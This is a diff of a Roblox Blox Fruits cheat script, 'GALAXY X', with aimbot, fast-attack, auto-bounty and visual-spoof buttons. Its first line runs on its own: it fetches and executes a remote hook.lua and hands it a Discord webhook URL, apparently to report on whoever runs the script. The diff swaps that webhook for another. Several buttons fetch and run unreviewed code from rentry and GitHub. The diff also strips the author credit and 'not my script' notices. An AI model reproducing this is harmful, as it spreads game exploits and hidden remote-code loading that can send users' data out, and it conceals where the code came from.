@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX/OneCreatorX/main/Scripts/web/hook.lua"))()("https://discord.com/api/webhooks/1269383717567336604/dfE9AkUmFV__FB8oY52FRJ5mXdhOghSyvqh8Z7ykfmvD6U-VMpFqbgQ2alzhnTJsY_vc")()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OneCreatorX/OneCreatorX/main/Scripts/web/hook.lua"))()("https://discord.com/api/webhooks/1272541548747292703/_BF-75aX5ugLfzkVLgvWztO-TMxDzBVLJKOkrhHsWH_8UcMDnAd3p-2VcbHCTt_dFFzf")()
 
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
@@ -6,7 +6,7 @@ local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.
 --------------------------------------------------------------------------------------------------------------------------------------------
 local Window = Fluent:CreateWindow({
     Title = "GALAXY X",
-    SubTitle = "By dearygt Galaxy x)",
+    SubTitle = "Galaxy x)",
     TabWidth = 160,
     Size = UDim2.fromOffset(450, 300),
     Acrylic = true, -- The blur may be detectable, setting this to false disables blur entirely
@@ -6213,7 +6213,7 @@ Tabs.Misc:AddButton({
 
 
 Tabs.Misc:AddButton({
-	Title = "Title Name",
+	Title = "Title Nombres",
 	Description = "",
 	Callback = function()
 		local args = {
@@ -6227,10 +6227,10 @@ Tabs.Misc:AddButton({
 
 
  Tabs.SubFarming:AddButton({
-            Title = "Coppy Server Discord Link",
-            Description = "Click(Join To see more updates)",
+            Title = "Link Del server",
+            Description = "Unete",
             Callback = function()
-            setclipboard("https://discord.com/invite/tEYvq9m3GT")
+            setclipboard("https://discord.gg/6K3dpu7j")
             Notify("Script Status", "Copied Discord Lin!", 10)
          end
     })
@@ -6238,7 +6238,7 @@ Tabs.Misc:AddButton({
 
     Tabs.SubFarming:AddButton({
         Title = "Auto Bounty Windybypass",
-        Description = "This Is Not my script all credits reversed",
+        Description = "",
         Callback = function()
             getgenv().Setting = {
                 ["Team"] = "Pirates",
@@ -6286,7 +6286,7 @@ Tabs.Misc:AddButton({
 
 Tabs.SubFarming:AddButton({
 	Title = "Aimbot v1", 
-	Description = "This is Not my Script Warning",
+	Description = "",
 	Callback = function()
         loadstring(game:HttpGet("https://rentry.co/n55gmtpi/raw", true))()
 
@@ -6296,7 +6296,7 @@ Tabs.SubFarming:AddButton({
 
  Tabs.SubFarming:AddButton({
             Title = "Fps Bost2",
-            Description = "!This Script Is not mine!",
+            Description = "",
             Callback = function()
             _G.Settings = {
     Players = {
@@ -6413,8 +6413,8 @@ end
 end)
 
    local FM = Tabs.SubFarming:AddParagraph({
-        Title = "Moon Status",
-        Content = "Go sea 3"
+        Title = "status de la luna",
+        Content = "Vete sea 3"
     })
     
     task.spawn(function()
@@ -6437,7 +6437,7 @@ end)
             end
     end)
 
-  local MobKilled = Tabs.SubFarming:AddParagraph({
+  local MobKilled = Tabs.Main:AddParagraph({
         Title = "Dough Boss Status",
         Content = ""
     })
@@ -6459,7 +6459,7 @@ end)
         end
     end)
     
-    local Elite_Hunter_Status = Tabs.SubFarming:AddParagraph({
+    local Elite_Hunter_Status = Tabs.Main:AddParagraph({
         Title = "Elite Status",
         Content = ""
     })
@@ -6477,7 +6477,7 @@ end)
 		end
 	end)
     
-    local Kitsune = Tabs.SubFarming:AddParagraph({
+    local Kitsune = Tabs.Main:AddParagraph({
         Title = "KITSUNE Island",
         Content = ""
     })
@@ -6495,7 +6495,7 @@ end)
 end)
 
 
-    local FrozenIsland = Tabs.SubFarming:AddParagraph({
+    local FrozenIsland = Tabs.Main:AddParagraph({
         Title = "Frozen Dimension",
         Content = ""
     })
@@ -6577,7 +6577,7 @@ spawn(function()
  end)
 
 Tabs.SubFarming:AddButton({
-	Title = "Go Pirate", 
+	Title = "vamo Pirate", 
 	Description = "",
 	Callback = function()
         local args = {
@@ -6595,7 +6595,7 @@ Tabs.SubFarming:AddButton({
 
 
 Tabs.SubFarming:AddButton({
-	Title = "Go Marine", 
+	Title = "vamo Marine", 
 	Description = "",
 	Callback = function()
         local args = {
@@ -6692,14 +6692,14 @@ Tabs.Shop:AddButton({
 })
 
 Tabs.SubFarming:AddButton({
-        Title = "Music Script with id", 
+        Title = "Script de musica con id", 
 	Description = "By me",
 	Callback = function()
         loadstring(game:HttpGet("https://raw.githubusercontent.com/DarTGTtfd/music-ui/main/music%20ui"))()
       end    
 })
 
-local ToggleEnablePvp = Tabs.SubFarming:AddToggle("ToggleEnablePvp", {Title = "Auto Enable PVP", Description = "",Default = false })
+local ToggleEnablePvp = Tabs.SubFarming:AddToggle("ToggleEnablePvp", {Title = "Auto que se active PVP", Description = "",Default = false })
 ToggleEnablePvp:OnChanged(function(Value)
   _G.EnabledPvP = Value
 end)
@@ -6719,7 +6719,7 @@ end)
 
 
 Tabs.Main:AddButton({
-	Title = "Rain Fruit",
+	Title = "Rain Fruit(Frutas old)",
 	Description = "",
 	Callback = function()
         for i, v in pairs(game:GetObjects("rbxassetid://14759368201")[1]:GetChildren()) do
@@ -6739,7 +6739,7 @@ Tabs.Main:AddButton({
 })
 
 Tabs.Main:AddButton({
-    Title = "Instant Level/Beli/EXP(Visual)",
+    Title = "Instant Level/dinero/xp(Visual)",
     Description = "",
     Callback = function()
         local plr = game:GetService("Players").LocalPlayer
@@ -6787,7 +6787,7 @@ Tabs.Main:AddButton({
 })
 
   Tabs.Race:AddButton({
-        Title = "Fake V4 CYBORG transform",
+        Title = "Fake V4 Cyborg transformation",
         Description = "",
         Callback = function()
         require(game:GetService("ReplicatedStorage").Notification).new("Cyborg V4!"):Display();
@@ -6870,7 +6870,7 @@ game:GetService("ReplicatedStorage"):WaitForChild("Modules"):WaitForChild("Net")
     })
 
 Tabs.Main:AddButton({
-        Title = "Very Fast Attack", 
+        Title = "Ataque Mui rapido no cd", 
 	Description = "",
 	Callback = function()
         local SuperFastMode = true -- Change to true if you want Super Super Super Fast attack (Like instant kill) but it will make the game kick you more than normal mode
